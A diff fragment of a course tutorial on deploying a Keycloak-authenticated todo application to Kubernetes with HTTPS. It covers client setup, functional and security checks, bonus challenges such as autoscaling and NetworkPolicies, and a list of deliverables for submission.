+python3 delete-client.py
+
+# Create new client with production URL
+python3 create-client.py
+```
+
+**5.2 Update CORS in Keycloak**
+
+The client creation script automatically configures Web Origins, but verify in Keycloak Admin Console:
+- Go to Clients → my-frontend-app
+- Check "Web Origins" includes `https://todo.ltu-m7011e-yourname.se`
+
+### Step 6: Test the Complete Application
+
+**6.1 Access the Application**
+
+Open browser: `https://todo.ltu-m7011e-yourname.se`
+
+**6.2 Verify Functionality**
+
+1. Click "Log In" button
+2. You should be redirected to Keycloak login
+3. Login with your test user
+4. You should be redirected back to the todo app
+5. Add a todo item
+6. Verify it appears in the list
+7. Toggle completion status
+8. Delete a todo
+
+**6.3 Verify Security**
+
+Check browser developer tools:
+- ✅ All requests use HTTPS
+- ✅ Valid Let's Encrypt certificate
+- ✅ Authorization header includes JWT token
+- ✅ API calls to `https://todo-api.ltu-m7011e-yourname.se`
+
+### Step 7: Bonus Challenges
+
+1. **Add Horizontal Pod Autoscaling (HPA)**
+   ```yaml
+   apiVersion: autoscaling/v2
+   kind: HorizontalPodAutoscaler
+   metadata:
+     name: todo-backend-hpa
+   spec:
+     scaleTargetRef:
+       apiVersion: apps/v1
+       kind: Deployment
+       name: todo-backend
+     minReplicas: 2
+     maxReplicas: 10
+     metrics:
+     - type: Resource
+       resource:
+         name: cpu
+         target:
+           type: Utilization
+           averageUtilization: 70
+   ```
+
+2. **Add Persistent Storage for Todos**
+   - Replace in-memory storage with PostgreSQL
+   - Create PersistentVolumeClaim
+   - Update Flask app to use SQLAlchemy
+
+3. **Implement Health Checks**
+   - Add `/health` endpoint to Flask app
+   - Configure advanced liveness/readiness probes
+
+4. **Add Monitoring**
+   - Deploy Prometheus and Grafana
+   - Export metrics from Flask app
+   - Create dashboards for request rate, latency, errors
+
+5. **Deploy with Argo CD**
+   - Create Argo CD Application manifest
+   - Set up GitOps workflow
+   - Implement automated deployments
+
+6. **Add NetworkPolicies**
+   - Restrict traffic between pods
+   - Allow only frontend → backend communication
+   - Allow only backend → Keycloak communication
+
+### Deliverables
+
+Submit:
+- [ ] All Kubernetes YAML files
+- [ ] Both Dockerfiles
+- [ ] Screenshots of running application
+- [ ] Screenshot of valid TLS certificate
+- [ ] Output of `kubectl get all -n yournamespace`
+- [ ] Brief report explaining your deployment choices
+
+---
+
 ## Exercise: Secure Your Previous Projects
 
 Now it's your turn! Add Keycloak authentication to one of your previous tutorial projects.
@@ -1041,7 +2091,6 @@ Now it's your turn! Add Keycloak authentication to one of your previous tutorial
 - Implement "Remember Me" functionality
 - Add user self-registration with email verification
 - Set up admin panel with user management
-- Deploy with Argo CD from Tutorial 11
 
 ---
 
